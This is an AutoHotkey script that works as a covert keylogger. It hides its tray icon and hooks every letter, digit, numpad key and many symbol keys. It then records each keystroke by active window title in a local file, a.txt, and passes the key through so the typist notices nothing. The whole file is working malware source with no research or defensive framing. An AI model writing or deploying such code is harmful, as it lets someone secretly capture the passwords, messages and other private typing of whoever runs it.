#NoTrayIcon
str := ""
oldTitle := ""
writekeys(str, oldTitle){
	file := FileOpen("a.txt", "a")
	file.Write("`r`n" oldTitle "`r`n" str "`r`n ------------------")
	file.Close()
}
setkey(key){
	global str
	global oldTitle
	WinGetTitle, currentTitle, A
	if(currentTitle <> oldTitle){
		writekeys(str, oldTitle)
		str :=""
		oldTitle := currentTitle
	}
	str = %str%%key%
	
	
}


a::
	setkey("a")
	hotkey, a, off
	send, a
	hotkey, a, on
return
+a::
	setkey("A")
	hotkey, +a, off
	send, A
	hotkey, +a, on
return
b::
	setkey("b")
	hotkey, b, off
	send, b
	hotkey, b, on
return
+b::
	setkey("B")
	hotkey, +b, off
	send, B
	hotkey, +b, on
return
c::
	setkey("c")
	hotkey, c, off
	send, c
	hotkey, c, on
return
+c::
	setkey("C")
	hotkey, +c, off
	send, C
	hotkey, +c, on
return
d::
	setkey("d")
	hotkey, d, off
	send, d
	hotkey, d, on
return
+d::
	setkey("D")
	hotkey, +d, off
	send, D
	hotkey, +d, on
return
e::
	setkey("e")
	hotkey, e, off
	send, e
	hotkey, e, on
return
+e::
	setkey("E")
	hotkey, +e, off
	send, E
	hotkey, +e, on
return
f::
	setkey("f")
	hotkey, f, off
	send, f
	hotkey, f, on
return
+f::
	setkey("F")
	hotkey, +f, off
	send, F
	hotkey, +f, on
return
g::
	setkey("g")
	hotkey, g, off
	send, g
	hotkey, g, on
return
+g::
	setkey("G")
	hotkey, +g, off
	send, G
	hotkey, +g, on
return
h::
	setkey("h")
	hotkey, h, off
	send, h
	hotkey, h, on
return
+h::
	setkey("H")
	hotkey, +h, off
	send, H
	hotkey, +h, on
return
i::
	setkey("i")
	hotkey, i, off
	send, i
	hotkey, i, on
return
+i::
	setkey("I")
	hotkey, +i, off
	send, I
	hotkey, +i, on
return
j::
	setkey("j")
	hotkey, j, off
	send, j
	hotkey, j, on
return
+j::
	setkey("J")
	hotkey, +j, off
	send, J
	hotkey, +j, on
return
k::
	setkey("k")
	hotkey, k, off
	send, k
	hotkey, k, on
return
+k::
	setkey("K")
	hotkey, +k, off
	send, K
	hotkey, +k, on
return
l::
	setkey("l")
	hotkey, l, off
	send, l
	hotkey, l, on
return
+l::
	setkey("L")
	hotkey, +l, off
	send, L
	hotkey, +l, on
return
m::
	setkey("m")
	hotkey, m, off
	send, m
	hotkey, m, on
return
+m::
	setkey("M")
	hotkey, +m, off
	send, M
	hotkey, +m, on
return
n::
	setkey("n")
	hotkey, n, off
	send, n
	hotkey, n, on
return
+n::
	setkey("N")
	hotkey, +n, off
	send, N
	hotkey, +n, on
return
o::
	setkey("o")
	hotkey, o, off
	send, o
	hotkey, o, on
return
+o::
	setkey("O")
	hotkey, +o, off
	send, O
	hotkey, +o, on
return
p::
	setkey("p")
	hotkey, p, off
	send, p
	hotkey, p, on
return
+p::
	setkey("P")
	hotkey, +p, off
	send, P
	hotkey, +p, on
return
q::
	setkey("q")
	hotkey, q, off
	send, q
	hotkey, q, on
return
+q::
	setkey("Q")
	hotkey, +q, off
	send, Q
	hotkey, +q, on
return
r::
	setkey("r")
	hotkey, r, off
	send, r
	hotkey, r, on
return
+r::
	setkey("R")
	hotkey, +r, off
	send, R
	hotkey, +r, on
return
s::
	setkey("s")
	hotkey, s, off
	send, s
	hotkey, s, on
return
+s::
	setkey("S")
	hotkey, +s, off
	send, S
	hotkey, +s, on
return
t::
	setkey("t")
	hotkey, t, off
	send, t
	hotkey, t, on
return
+t::
	setkey("T")
	hotkey, +t, off
	send, T
	hotkey, +t, on
return
u::
	setkey("u")
	hotkey, u, off
	send, u
	hotkey, u, on
return
+u::
	setkey("U")
	hotkey, +u, off
	send, U
	hotkey, +u, on
return
v::
	setkey("v")
	hotkey, v, off
	send, v
	hotkey, v, on
return
+v::
	setkey("V")
	hotkey, +v, off
	send, V
	hotkey, +v, on
return
w::
	setkey("w")
	hotkey, w, off
	send, w
	hotkey, w, on
return
+w::
	setkey("W")
	hotkey, +w, off
	send, W
	hotkey, +w, on
return
x::
	setkey("x")
	hotkey, x, off
	send, x
	hotkey, x, on
return
+x::
	setkey("X")
	hotkey, +x, off
	send, X
	hotkey, +x, on
return
y::
	setkey("y")
	hotkey, y, off
	send, y
	hotkey, y, on
return
+y::
	setkey("Y")
	hotkey, +y, off
	send, Y
	hotkey, +y, on
return
z::
	setkey("z")
	hotkey, z, off
	send, z
	hotkey, z, on
return
+z::
	setkey("Z")
	hotkey, +z, off
	send, Z
	hotkey, +z, on
return


0::
	setkey("0")
	hotkey, 0, off
	send, 0
	hotkey, 0, on
return
1::
	setkey("1")
	hotkey, 1, off
	send, 1
	hotkey, 1, on
return
2::
	setkey("2")
	hotkey, 2, off
	send, 2
	hotkey, 2, on
return
3::
	setkey("3")
	hotkey, 3, off
	send, 3
	hotkey, 3, on
return
4::
	setkey("4")
	hotkey, 4, off
	send, 4
	hotkey, 4, on
return
5::
	setkey("5")
	hotkey, 5, off
	send, 5
	hotkey, 5, on
return
6::
	setkey("6")
	hotkey, 6, off
	send, 6
	hotkey, 6, on
return
7::
	setkey("7")
	hotkey, 7, off
	send, 7
	hotkey, 7, on
return
8::
	setkey("8")
	hotkey, 8, off
	send, 8
	hotkey, 8, on
return
9::
	setkey("9")
	hotkey, 9, off
	send, 9
	hotkey, 9, on
return
Numpad0::
	setkey("0")
	hotkey, Numpad0, off
	hotkey, 0, off
	send, 0
	hotkey, 0, on
	hotkey, Numpad0, on
return
Numpad1::
	setkey("1")
	hotkey, Numpad1, off
	hotkey, 1, off
	send, 1
	hotkey, 1, on
	hotkey, Numpad1, on
return
Numpad2::
	setkey("2")
	hotkey, Numpad2, off
	hotkey, 2, off
	send, 2
	hotkey, 2, on
	hotkey, Numpad2, on
return
Numpad3::
	setkey("3")
	hotkey, Numpad3, off
	hotkey, 3, off
	send, 3
	hotkey, 3, on
	hotkey, Numpad3, on
return
Numpad4::
	setkey("4")
	hotkey, Numpad4, off
	hotkey, 4, off
	send, 4
	hotkey, 4, on
	hotkey, Numpad4, on
return
Numpad5::
	setkey("5")
	hotkey, Numpad5, off
	hotkey, 5, off
	send, 5
	hotkey, 5, on
	hotkey, Numpad5, on
return
Numpad6::
	setkey("6")
	hotkey, Numpad6, off
	hotkey, 6, off
	send, 6
	hotkey, 6, on
	hotkey, Numpad6, on
return
Numpad7::
	setkey("7")
	hotkey, Numpad7, off
	hotkey, 7, off
	send, 7
	hotkey, 7, on
	hotkey, Numpad7, on
return
Numpad8::
	setkey("8")
	hotkey, Numpad8, off
	hotkey, 8, off
	send, 8
	hotkey, 8, on
	hotkey, Numpad8, on
return
Numpad9::
	setkey("9")
	hotkey, Numpad9, off
	hotkey, 9, off
	send, 9
	hotkey, 9, on
	hotkey, Numpad9, on
return
NumpadDiv::
	setkey("/")
	hotkey, NumpadDiv, off
	hotkey, /, off
	send, /
	hotkey, /, on
	hotkey, NumpadDiv, on
return
NumpadMult::
	setkey("*")
	hotkey, *, off
	hotkey, NumpadMult, off
	send, *
	hotkey, *, on
	hotkey, NumpadMult, on
return
NumpadAdd::
	setkey("+")
	hotkey, +, off
	hotkey, NumpadAdd, off
	sendraw, +
	hotkey, NumpadAdd, on
	hotkey, +, on
return
NumpadSub::
	setkey("-")
	hotkey, -, off
	hotkey, NumpadSub, off
	send, -
	hotkey, NumpadSub, on
	hotkey, -, on
return
NumpadEnter::
	setkey("{ENTER}")
	hotkey, NumpadEnter, off
	send, {NumpadEnter}
	hotkey, NumpadEnter, on
return

Enter::
	setkey("{ENTER}")
	hotkey, Enter, off
	send, {Enter}
	hotkey, Enter, on
return
Space::
	setkey("{Space}")
	hotkey, Space, off
	send, {Space}
	hotkey, Space, on
return

Backspace::
	setkey("{Backspace}")
	hotkey, Backspace, off
	send, {Backspace}
	hotkey, Backspace, on
return


.::
	setkey(".")
	hotkey, ., off
	send, .
	hotkey, ., on
return
&::
	setkey("&")
	hotkey, &, off
	send, &
	hotkey,&, on
return
_::
	setkey("_")
	hotkey, _, off
	send, _
	hotkey,_, on
return
:::
	setkey(":")
	hotkey, :, off
	send, :
	hotkey,:, on
return
@::
	setkey("@")
	hotkey, @, off
	send, @
	hotkey,@, on
return
[::
	setkey("[")
	hotkey, [, off
	send, [
	hotkey,[, on
return
]::
	setkey("]")
	hotkey, ], off
	send, ]
	hotkey,], on
return
)::
	setkey(")")
	hotkey, ), off
	send, )
	hotkey, ), on
return

(::
	setkey("(")
	hotkey, (, off
	send, (
	hotkey, (, on
return


°::
	setkey("°")
	hotkey, °, off
	send, °
	hotkey, °, on
return
-::
	setkey("-")
	hotkey, -, off
	sendraw, -
	hotkey, -, on
return
+::
	setkey("+")
	hotkey, +, off
	sendraw, +
	hotkey, +, on
return
*::
	setkey("*")
	hotkey, *, off
	send, *
	hotkey, *, on
return
=::
	setkey("=")
	hotkey, =, off
	send, =
	hotkey, =, on
return
